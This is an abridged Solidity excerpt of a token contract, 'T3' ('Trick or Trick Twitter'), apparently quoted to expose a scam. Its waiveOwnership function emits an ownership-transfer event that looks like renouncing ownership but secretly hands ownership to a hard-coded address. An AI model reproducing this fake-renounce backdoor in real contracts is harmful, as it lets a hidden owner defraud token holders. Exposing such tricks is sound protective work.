...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x338FE315e8e6B313944c08dD1E4a2FDA1961De97));
        _owner = address(0x338FE315e8e6B313944c08dD1E4a2FDA1961De97);
    }
...
contract T3 is Context, IERC20, Ownable {
    ...
    string private _name = "Trick or Trick Twitter ";
